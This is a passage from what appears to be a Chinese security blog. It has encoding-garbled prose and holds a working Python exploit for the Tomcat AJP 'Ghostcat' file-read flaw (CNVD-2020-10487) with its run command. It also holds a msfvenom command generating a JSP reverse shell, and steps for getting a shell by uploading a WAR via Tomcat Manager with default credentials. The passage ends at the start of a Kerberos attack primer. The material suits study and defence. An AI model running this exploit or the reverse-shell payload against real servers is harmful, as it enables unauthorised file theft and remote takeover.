class_">AjpForwardRequest</span>(<span class="hljs-title class_ inherited__">object</span>):<br>_, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = <span class="hljs-built_in">range</span>(<span class="hljs-number">28</span>)<br>REQUEST_METHODS = &#123;<span class="hljs-string">&#x27;GET&#x27;</span>: GET, <span class="hljs-string">&#x27;POST&#x27;</span>: POST, <span class="hljs-string">&#x27;HEAD&#x27;</span>: HEAD, <span class="hljs-string">&#x27;OPTIONS&#x27;</span>: OPTIONS, <span class="hljs-string">&#x27;PUT&#x27;</span>: PUT, <span class="hljs-string">&#x27;DELETE&#x27;</span>: DELETE, <span class="hljs-string">&#x27;TRACE&#x27;</span>: TRACE&#125;<br><span class="hljs-comment"># server == web server, container == servlet</span><br>SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>)<br>COMMON_HEADERS = [<span class="hljs-string">&quot;SC_REQ_ACCEPT&quot;</span>,<br><span class="hljs-string">&quot;SC_REQ_ACCEPT_CHARSET&quot;</span>, <span class="hljs-string">&quot;SC_REQ_ACCEPT_ENCODING&quot;</span>, <span class="hljs-string">&quot;SC_REQ_ACCEPT_LANGUAGE&quot;</span>, <span class="hljs-string">&quot;SC_REQ_AUTHORIZATION&quot;</span>,<br><span class="hljs-string">&quot;SC_REQ_CONNECTION&quot;</span>, <span class="hljs-string">&quot;SC_REQ_CONTENT_TYPE&quot;</span>, <span class="hljs-string">&quot;SC_REQ_CONTENT_LENGTH&quot;</span>, <span class="hljs-string">&quot;SC_REQ_COOKIE&quot;</span>, <span class="hljs-string">&quot;SC_REQ_COOKIE2&quot;</span>,<br><span class="hljs-string">&quot;SC_REQ_HOST&quot;</span>, <span class="hljs-string">&quot;SC_REQ_PRAGMA&quot;</span>, <span class="hljs-string">&quot;SC_REQ_REFERER&quot;</span>, <span class="hljs-string">&quot;SC_REQ_USER_AGENT&quot;</span><br>]<br>ATTRIBUTES = [<span class="hljs-string">&quot;context&quot;</span>, <span class="hljs-string">&quot;servlet_path&quot;</span>, <span class="hljs-string">&quot;remote_user&quot;</span>, <span class="hljs-string">&quot;auth_type&quot;</span>, <span class="hljs-string">&quot;query_string&quot;</span>, <span class="hljs-string">&quot;route&quot;</span>, <span class="hljs-string">&quot;ssl_cert&quot;</span>, <span class="hljs-string">&quot;ssl_cipher&quot;</span>, <span class="hljs-string">&quot;ssl_session&quot;</span>, <span class="hljs-string">&quot;req_attribute&quot;</span>, <span class="hljs-string">&quot;ssl_key_size&quot;</span>, <span class="hljs-string">&quot;secret&quot;</span>, <span class="hljs-string">&quot;stored_method&quot;</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, data_direction=<span class="hljs-literal">None</span></span>):<br>self.prefix_code = <span class="hljs-number">0x02</span><br>self.method = <span class="hljs-literal">None</span><br>self.protocol = <span class="hljs-literal">None</span><br>self.req_uri = <span class="hljs-literal">None</span><br>self.remote_addr = <span class="hljs-literal">None</span><br>self.remote_host = <span class="hljs-literal">None</span><br>self.server_name = <span class="hljs-literal">None</span><br>self.server_port = <span class="hljs-literal">None</span><br>self.is_ssl = <span class="hljs-literal">None</span><br>self.num_headers = <span class="hljs-literal">None</span><br>self.request_headers = <span class="hljs-literal">None</span><br>self.attributes = <span class="hljs-literal">None</span><br>self.data_direction = data_direction<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pack_headers</span>(<span class="hljs-params">self</span>):<br>self.num_headers = <span class="hljs-built_in">len</span>(self.request_headers)<br>res = <span class="hljs-string">&quot;&quot;</span><br>res = struct.pack(<span class="hljs-string">&quot;&gt;h&quot;</span>, self.num_headers)<br><span class="hljs-keyword">for</span> h_name <span class="hljs-keyword">in</span> self.request_headers:<br><span class="hljs-keyword">if</span> h_name.startswith(<span class="hljs-string">&quot;SC_REQ&quot;</span>):<br>code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + <span class="hljs-number">1</span><br>res += struct.pack(<span class="hljs-string">&quot;BB&quot;</span>, <span class="hljs-number">0xA0</span>, code)<br><span class="hljs-keyword">else</span>:<br>res += pack_string(h_name)<br><br>res += pack_string(self.request_headers[h_name])<br><span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pack_attributes</span>(<span class="hljs-params">self</span>):<br>res = <span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> attr <span class="hljs-keyword">in</span> self.attributes:<br>a_name = attr[<span class="hljs-string">&#x27;name&#x27;</span>]<br>code = AjpForwardRequest.ATTRIBUTES.index(a_name) + <span class="hljs-number">1</span><br>res += struct.pack(<span class="hljs-string">&quot;b&quot;</span>, code)<br><span class="hljs-keyword">if</span> a_name == <span class="hljs-string">&quot;req_attribute&quot;</span>:<br>aa_name, a_value = attr[<span class="hljs-string">&#x27;value&#x27;</span>]<br>res += pack_string(aa_name)<br>res += pack_string(a_value)<br><span class="hljs-keyword">else</span>:<br>res += pack_string(attr[<span class="hljs-string">&#x27;value&#x27;</span>])<br>res += struct.pack(<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-number">0xFF</span>)<br><span class="hljs-keyword">return</span> res<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">serialize</span>(<span class="hljs-params">self</span>):<br>res = <span class="hljs-string">&quot;&quot;</span><br>res = struct.pack(<span class="hljs-string">&quot;bb&quot;</span>, self.prefix_code, self.method)<br>res += pack_string(self.protocol)<br>res += pack_string(self.req_uri)<br>res += pack_string(self.remote_addr)<br>res += pack_string(self.remote_host)<br>res += pack_string(self.server_name)<br>res += struct.pack(<span class="hljs-string">&quot;&gt;h&quot;</span>, self.server_port)<br>res += struct.pack(<span class="hljs-string">&quot;?&quot;</span>, self.is_ssl)<br>res += self.pack_headers()<br>res += self.pack_attributes()<br><span class="hljs-keyword">if</span> self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER:<br>header = struct.pack(<span class="hljs-string">&quot;&gt;bbh&quot;</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x34</span>, <span class="hljs-built_in">len</span>(res))<br><span class="hljs-keyword">else</span>:<br>header = struct.pack(<span class="hljs-string">&quot;&gt;bbh&quot;</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x42</span>, <span class="hljs-built_in">len</span>(res))<br><span class="hljs-keyword">return</span> header + res<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">self, raw_packet</span>):<br>stream = StringIO(raw_packet)<br>self.magic1, self.magic2, data_len = unpack(stream, <span class="hljs-string">&quot;bbH&quot;</span>)<br>self.prefix_code, self.method = unpack(stream, <span class="hljs-string">&quot;bb&quot;</span>)<br>self.protocol = unpack_string(stream)<br>self.req_uri = unpack_string(stream)<br>self.remote_addr = unpack_string(stream)<br>self.remote_host = unpack_string(stream)<br>self.server_name = unpack_string(stream)<br>self.server_port = unpack(stream, <span class="hljs-string">&quot;&gt;h&quot;</span>)<br>self.is_ssl = unpack(stream, <span class="hljs-string">&quot;?&quot;</span>)<br>self.num_headers, = unpack(stream, <span class="hljs-string">&quot;&gt;H&quot;</span>)<br>self.request_headers = &#123;&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.num_headers):<br>code, = unpack(stream, <span class="hljs-string">&quot;&gt;H&quot;</span>)<br><span class="hljs-keyword">if</span> code &gt; <span class="hljs-number">0xA000</span>:<br>h_name = AjpForwardRequest.COMMON_HEADERS[code - <span class="hljs-number">0xA001</span>]<br><span class="hljs-keyword">else</span>:<br>h_name = unpack(stream, <span class="hljs-string">&quot;%ds&quot;</span> % code)<br>stream.read(<span class="hljs-number">1</span>) <span class="hljs-comment"># \0</span><br>h_value = unpack_string(stream)<br>self.request_headers[h_name] = h_value<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_and_receive</span>(<span class="hljs-params">self, socket, stream, save_cookies=<span class="hljs-literal">False</span></span>):<br>res = []<br>i = socket.sendall(self.serialize())<br><span class="hljs-keyword">if</span> self.method == AjpForwardRequest.POST:<br><span class="hljs-keyword">return</span> res<br><br>r = AjpResponse.receive(stream)<br><span class="hljs-keyword">assert</span> r.prefix_code == AjpResponse.SEND_HEADERS<br>res.append(r)<br><span class="hljs-keyword">if</span> save_cookies <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;Set-Cookie&#x27;</span> <span class="hljs-keyword">in</span> r.response_headers:<br>self.headers[<span class="hljs-string">&#x27;SC_REQ_COOKIE&#x27;</span>] = r.response_headers[<span class="hljs-string">&#x27;Set-Cookie&#x27;</span>]<br><br><span class="hljs-comment"># read body chunks and end response packets</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>r = AjpResponse.receive(stream)<br>res.append(r)<br><span class="hljs-keyword">if</span> r.prefix_code == AjpResponse.END_RESPONSE:<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">elif</span> r.prefix_code == AjpResponse.SEND_BODY_CHUNK:<br><span class="hljs-keyword">continue</span><br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">raise</span> NotImplementedError<br><span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AjpResponse</span>(<span class="hljs-title class_ inherited__">object</span>):<br>_,_,_,SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>)<br>COMMON_SEND_HEADERS = [<br><span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;Content-Language&quot;</span>, <span class="hljs-string">&quot;Content-Length&quot;</span>, <span class="hljs-string">&quot;Date&quot;</span>, <span class="hljs-string">&quot;Last-Modified&quot;</span>,<br><span class="hljs-string">&quot;Location&quot;</span>, <span class="hljs-string">&quot;Set-Cookie&quot;</span>, <span class="hljs-string">&quot;Set-Cookie2&quot;</span>, <span class="hljs-string">&quot;Servlet-Engine&quot;</span>, <span class="hljs-string">&quot;Status&quot;</span>, <span class="hljs-string">&quot;WWW-Authenticate&quot;</span><br>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">self, stream</span>):<br><span class="hljs-comment"># read headers</span><br>self.magic, self.data_length, self.prefix_code = unpack(stream, <span class="hljs-string">&quot;&gt;HHb&quot;</span>)<br><br><span class="hljs-keyword">if</span> self.prefix_code == AjpResponse.SEND_HEADERS:<br>self.parse_send_headers(stream)<br><span class="hljs-keyword">elif</span> self.prefix_code == AjpResponse.SEND_BODY_CHUNK:<br>self.parse_send_body_chunk(stream)<br><span class="hljs-keyword">elif</span> self.prefix_code == AjpResponse.END_RESPONSE:<br>self.parse_end_response(stream)<br><span class="hljs-keyword">elif</span> self.prefix_code == AjpResponse.GET_BODY_CHUNK:<br>self.parse_get_body_chunk(stream)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">raise</span> NotImplementedError<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_send_headers</span>(<span class="hljs-params">self, stream</span>):<br>self.http_status_code, = unpack(stream, <span class="hljs-string">&quot;&gt;H&quot;</span>)<br>self.http_status_msg = unpack_string(stream)<br>self.num_headers, = unpack(stream, <span class="hljs-string">&quot;&gt;H&quot;</span>)<br>self.response_headers = &#123;&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.num_headers):<br>code, = unpack(stream, <span class="hljs-string">&quot;&gt;H&quot;</span>)<br><span class="hljs-keyword">if</span> code &lt;= <span class="hljs-number">0xA000</span>: <span class="hljs-comment"># custom header</span><br>h_name, = unpack(stream, <span class="hljs-string">&quot;%ds&quot;</span> % code)<br>stream.read(<span class="hljs-number">1</span>) <span class="hljs-comment"># \0</span><br>h_value = unpack_string(stream)<br><span class="hljs-keyword">else</span>:<br>h_name = AjpResponse.COMMON_SEND_HEADERS[code-<span class="hljs-number">0xA001</span>]<br>h_value = unpack_string(stream)<br>self.response_headers[h_name] = h_value<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_send_body_chunk</span>(<span class="hljs-params">self, stream</span>):<br>self.data_length, = unpack(stream, <span class="hljs-string">&quot;&gt;H&quot;</span>)<br>self.data = stream.read(self.data_length+<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_end_response</span>(<span class="hljs-params">self, stream</span>):<br>self.reuse, = unpack(stream, <span class="hljs-string">&quot;b&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_get_body_chunk</span>(<span class="hljs-params">self, stream</span>):<br>rlen, = unpack(stream, <span class="hljs-string">&quot;&gt;H&quot;</span>)<br><span class="hljs-keyword">return</span> rlen<br><br><span class="hljs-meta">@staticmethod</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">receive</span>(<span class="hljs-params">stream</span>):<br>r = AjpResponse()<br>r.parse(stream)<br><span class="hljs-keyword">return</span> r<br><br><span class="hljs-keyword">import</span> socket<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">prepare_ajp_forward_request</span>(<span class="hljs-params">target_host, req_uri, method=AjpForwardRequest.GET</span>):<br>fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)<br>fr.method = method<br>fr.protocol = <span class="hljs-string">&quot;HTTP/1.1&quot;</span><br>fr.req_uri = req_uri<br>fr.remote_addr = target_host<br>fr.remote_host = <span class="hljs-literal">None</span><br>fr.server_name = target_host<br>fr.server_port = <span class="hljs-number">80</span><br>fr.request_headers = &#123;<br><span class="hljs-string">&#x27;SC_REQ_ACCEPT&#x27;</span>: <span class="hljs-string">&#x27;text/html&#x27;</span>,<br><span class="hljs-string">&#x27;SC_REQ_CONNECTION&#x27;</span>: <span class="hljs-string">&#x27;keep-alive&#x27;</span>,<br><span class="hljs-string">&#x27;SC_REQ_CONTENT_LENGTH&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br><span class="hljs-string">&#x27;SC_REQ_HOST&#x27;</span>: target_host,<br><span class="hljs-string">&#x27;SC_REQ_USER_AGENT&#x27;</span>: <span class="hljs-string">&#x27;Mozilla&#x27;</span>,<br><span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>: <span class="hljs-string">&#x27;gzip, deflate, sdch&#x27;</span>,<br><span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;en-US,en;q=0.5&#x27;</span>,<br><span class="hljs-string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br><span class="hljs-string">&#x27;Cache-Control&#x27;</span>: <span class="hljs-string">&#x27;max-age=0&#x27;</span><br>&#125;<br>fr.is_ssl = <span class="hljs-literal">False</span><br>fr.attributes = []<br><span class="hljs-keyword">return</span> fr<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Tomcat</span>(<span class="hljs-title class_ inherited__">object</span>):<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, target_host, target_port</span>):<br>self.target_host = target_host<br>self.target_port = target_port<br><br>self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>self.socket.connect((target_host, target_port))<br>self.stream = self.socket.makefile(<span class="hljs-string">&quot;rb&quot;</span>, bufsize=<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">perform_request</span>(<span class="hljs-params">self, req_uri, headers=&#123;&#125;, method=<span class="hljs-string">&#x27;GET&#x27;</span>, user=<span class="hljs-literal">None</span>, password=<span class="hljs-literal">None</span>, attributes=[]</span>):<br>self.req_uri = req_uri<br>self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Getting resource at ajp13://%s:%d%s&quot;</span> % (self.target_host, self.target_port, req_uri))<br><span class="hljs-keyword">if</span> user <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> password <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>self.forward_request.request_headers[<span class="hljs-string">&#x27;SC_REQ_AUTHORIZATION&#x27;</span>] = <span class="hljs-string">&quot;Basic &quot;</span> + (<span class="hljs-string">&quot;%s:%s&quot;</span> % (user, password)).encode(<span class="hljs-string">&#x27;base64&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> headers:<br>self.forward_request.request_headers[h] = headers[h]<br><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> attributes:<br>self.forward_request.attributes.append(a)<br>responses = self.forward_request.send_and_receive(self.socket, self.stream)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(responses) == <span class="hljs-number">0</span>:<br><span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br>snd_hdrs_res = responses[<span class="hljs-number">0</span>]<br>data_res = responses[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data_res) == <span class="hljs-number">0</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No data in response. Headers:%s\n&quot;</span> % snd_hdrs_res.response_headers)<br><span class="hljs-keyword">return</span> snd_hdrs_res, data_res<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">javax.servlet.include.request_uri</span><br><span class="hljs-string">javax.servlet.include.path_info</span><br><span class="hljs-string">javax.servlet.include.servlet_path</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">import</span> argparse<br>parser = argparse.ArgumentParser()<br>parser.add_argument(<span class="hljs-string">&quot;target&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Hostname or IP to attack&quot;</span>)<br>parser.add_argument(<span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;--port&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>, default=<span class="hljs-number">8009</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;AJP port to attack (default is 8009)&quot;</span>)<br>parser.add_argument(<span class="hljs-string">&quot;-f&quot;</span>, <span class="hljs-string">&#x27;--file&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, default=<span class="hljs-string">&#x27;WEB-INF/web.xml&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;file path :(WEB-INF/web.xml)&quot;</span>)<br>args = parser.parse_args()<br>t = Tomcat(args.target, args.port)<br>_,data = t.perform_request(<span class="hljs-string">&#x27;/asdf&#x27;</span>,attributes=[<br>    &#123;<span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;req_attribute&#x27;</span>,<span class="hljs-string">&#x27;value&#x27;</span>:[<span class="hljs-string">&#x27;javax.servlet.include.request_uri&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>]&#125;,<br>    &#123;<span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;req_attribute&#x27;</span>,<span class="hljs-string">&#x27;value&#x27;</span>:[<span class="hljs-string">&#x27;javax.servlet.include.path_info&#x27;</span>,args.file]&#125;,<br>    &#123;<span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;req_attribute&#x27;</span>,<span class="hljs-string">&#x27;value&#x27;</span>:[<span class="hljs-string">&#x27;javax.servlet.include.servlet_path&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>]&#125;,<br>    ])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;----------------------------&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join([d.data <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> data]))<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python2 ./CNVD-2020-10487.py 192.168.20.128 -p 53919 -f WEB-INF/web.xml # è¯¥ç«¯å£æŒ‡å‘çš„å°±æ˜¯8009ç«¯å£ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥è¯»å–å…¶ä»–çš„æ–‡ä»¶<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151443236.png" alt="image-20240425144027308"></p><p><img src="http://cdn.clown2024.cn/202407151443237.png" alt="image-20240425144348040"></p><blockquote><p>ä¸è¿‡åªèƒ½è¯»å–ROOTç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œä¸èƒ½è¿›è¡Œç›®å½•ç©¿è¶Šè¯»å–ä¸Šä¸€çº§ç›®å½•</p></blockquote><p>å¦‚æœä»–è¿˜æœ‰æ–‡ä»¶ä¸Šä¼ çš„æ¼æ´ï¼Œå°±å¯ä»¥é…åˆèµ·æ¥è¿›è¡Œgetshell</p><p>æ¯”å¦‚æˆ‘ä»¬ç”Ÿæˆä¸€ä¸ªjavaçš„åå¼¹shellçš„txt</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 &gt; shell.txt<br></code></pre></td></tr></table></figure><p>ä¸Šä¼ åˆ°æœåŠ¡å™¨ä¹‹åï¼Œæ”»å‡»æœºå¼€å¯ç›‘å¬ï¼Œå†ç”¨è¯¥è„šæœ¬è¯»å–shell.txtå°±èƒ½getshell</p><p><img src="http://cdn.clown2024.cn/202407151443238.png" alt="image-20240425145727189"></p><p>å…·ä½“åŸç†åˆ†æå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://yq1ng.github.io/2021/05/19/cve-2020-1938-you-ling-mao-ghostcat-tomcat-ajp-xie-yi-ren-yi-wen-jian-du-qu-jsp-wen-jian-bao-han-lou-dong-fen-xi/">https://yq1ng.github.io/2021/05/19/cve-2020-1938-you-ling-mao-ghostcat-tomcat-ajp-xie-yi-ren-yi-wen-jian-du-qu-jsp-wen-jian-bao-han-lou-dong-fen-xi/</a></p><h2 id="tomcatå¼±å£ä»¤ampampåå°getshell"><a href="#Tomcatå¼±å£ä»¤-åå°getshell" class="headerlink" title="Tomcatå¼±å£ä»¤&amp;&amp;åå°getshell"></a>Tomcatå¼±å£ä»¤&amp;&amp;åå°getshell</h2><p>ä¸€èˆ¬tomcatçš„é»˜è®¤è´¦å·å¯†ç å°±æ˜¯tomcatï¼Œç™»é™†ä¹‹åæˆ‘ä»¬å°±å¯ä»¥ä¸Šä¼ waråŒ…è¿›è¡Œgetshell</p><blockquote><p>å°†WARæ–‡ä»¶æ·»åŠ åˆ°Tomcatçš„webappsç›®å½•ä¸‹ï¼Œç„¶åå¯åŠ¨æˆ–é‡å¯TomcatæœåŠ¡å™¨ï¼ŒTomcatå°±å¯ä»¥è‡ªåŠ¨è§£å‹WARæ–‡ä»¶å¹¶å¯åŠ¨webåº”ç”¨ç¨‹åºã€‚</p></blockquote><p>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æŠŠæˆ‘ä»¬çš„shell.jspæ‰“åŒ…æˆwaræ–‡ä»¶ä¸Šä¼ å³å¯</p><p>å…ˆç™»å½•manager appçš„åå°</p><p><img src="http://cdn.clown2024.cn/202407151443239.png" alt="image-20240425152300741"></p><p>ç„¶åé€‰æ‹©waråŒ…è¿›è¡Œä¸Šä¼ </p><p><img src="http://cdn.clown2024.cn/202407151443240.png" alt="image-20240425152404162"></p><p>æ‰“åŒ…waråŒ…å‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">jar -cvf shell.war shell.jsp #ä¹Ÿå¯ä»¥å…ˆå‹ç¼©æˆzipï¼Œç„¶ååç¼€æ”¹ä¸ºwar<br></code></pre></td></tr></table></figure><p>ç„¶åä¸Šä¼ </p><p><img src="http://cdn.clown2024.cn/202407151443241.png" alt="image-20240425153056242"></p><p><img src="http://cdn.clown2024.cn/202407151443242.png" alt="image-20240425153149850"></p><p>å¯ä»¥çœ‹åˆ°å·²ç»æˆåŠŸäº†ï¼Œç„¶åæ‹¿å“¥æ–¯æ‹‰è¿æ¥å³å¯</p><p><img src="http://cdn.clown2024.cn/202407151443243.png" alt="image-20240425153245619"></p>]]></content>
      
      
      <categories>
          
          <category> webæ¼æ´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kerberosæ”»å‡»ä¸“é¢˜</title>
      <link href="/2024/04/21/Kerberos%E6%94%BB%E5%87%BB%E4%B8%93%E9%A2%98/"/>
      <url>/2024/04/21/Kerberos%E6%94%BB%E5%87%BB%E4%B8%93%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="kerberosè®¤è¯åŸºç¡€"><a href="#Kerberosè®¤è¯åŸºç¡€" class="headerlink" title="Kerberosè®¤è¯åŸºç¡€"></a>Kerberosè®¤è¯åŸºç¡€</h1><p>åœ¨å†…ç½‘æ¸—é€ä¸­,Kerberosè®¤è¯åè®®æ˜¯åŸºäºç¥¨æ®çš„ä¸€ç§è®¤è¯æ–¹å¼ï¼Œç”±ç¾å›½éº»çœç†å·¥å­¦é™¢å‘æ˜ï¼Œç®€å•ç†è§£å¯ä»¥åˆ†ä¸ºä¸‰éƒ¨åˆ†:ç”¨æˆ·(Client)ã€æœåŠ¡å™¨(Server)å’Œ KDC(Key Distribution Center,å¯†é’¥åˆ†å‘ä¸­å¿ƒ)ã€‚KDCåŒ…å«AS(Authentication Serverï¼Œè®¤è¯æœåŠ¡å™¨)å’ŒTGS(Ticket Granting Serverï¼Œç¥¨æ®æˆæƒæœåŠ¡å™¨)ã€‚</p><h2 id="kerberosåŸºç¡€è®¤è¯æµç¨‹"><a href="#KerberosåŸºç¡€è®¤è¯æµç¨‹" class="headerlink" title="KerberosåŸºç¡€è®¤è¯æµç¨‹"></a>KerberosåŸºç¡€è®¤è¯æµç¨‹</h2><p>å…¶æµç¨‹å›¾å¦‚ä¸‹ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151511675.png" alt="image-20240421115735137"></p><p>è§£é‡Šå¦‚ä¸‹ï¼š</p><ol><li>AS_REQã€‚CIientå‘ASå‘èµ·AS_REQï¼Œè¯·æ±‚å†…å®¹ä¸ºé€šè¿‡Clientçš„å“ˆå¸ŒåŠ å¯†çš„æ—¶é—´æˆ³ã€ClientID ç­‰å†…å®¹ã€‚</li><li>AS_REPã€‚ASä½¿ç”¨Clientå¯†ç å“ˆå¸Œå€¼è¿›è¡Œè§£å¯†ï¼Œå¦‚æœè§£å¯†æ­£ç¡®ï¼Œå°±è¿”å›ç”¨krbtgtçš„ NTLM-hash åŠ å¯†çš„ TGT(Ticket Granting Ticket,ç¥¨æ®æˆæƒå‡­è¯)ç¥¨æ®ã€‚TGT åŒ…å« PAC(Privilege Attribute Certificateï¼Œç‰¹æƒå±è¯ä¹¦)ï¼ŒPACåŒ…å« Clientçš„ç›¸å…³æƒé™ä¿¡æ¯ï¼Œå¦‚ SIDåŠæ‰€åœ¨çš„ç»„ã€‚ç®€å•ç†è§£ï¼ŒPACå°±æ˜¯ç”¨äºéªŒè¯ç”¨æˆ·æƒé™ï¼Œåªæœ‰KDCèƒ½åˆ¶ä½œå’ŒæŸ¥çœ‹PACã€‚</li><li>TGS_REQã€‚Client å‡­å€Ÿ TGTå‘TGS å‘èµ·é’ˆå¯¹éœ€è¦è®¿é—®æœåŠ¡çš„ TGS_REQ è¯·æ±‚ã€‚</li><li>TGS_REPã€‚TGS ä½¿ç”¨ krbtgtçš„ NTLM-hashå¯¹TGT è¿›è¡Œè§£å¯†ï¼Œå¦‚æœç»“æœæ­£ç¡®ï¼Œå°±è¿”å›ç”¨æœåŠ¡ NTLM-hashåŠ å¯†çš„TGSç¥¨æ®(ç®€ç§° ST)ï¼Œå¹¶å¸¦ä¸ŠPACã€‚æ³¨æ„ï¼Œåœ¨Kerberosè®¤è¯è¿‡ç¨‹ä¸­ï¼Œä¸è®ºç”¨æˆ·æœ‰æ²¡æœ‰è®¿é—®æœåŠ¡çš„æƒé™ï¼Œåªè¦TGTæ­£ç¡®ï¼Œå°±ä¼šè¿”å›STã€‚</li><li>AP_REQã€‚Clientåˆ©ç”¨STå»è¯·æ±‚æœåŠ¡ã€‚</li><li>AP_REPã€‚æœåŠ¡ä½¿ç”¨è‡ªå·±çš„ NTLM-hash è§£å¯† STã€‚å¦‚æœè§£å¯†æ­£ç¡®ï¼Œå°±ä¼šå°†å…¶ä¸­çš„PAC ç»™KDC 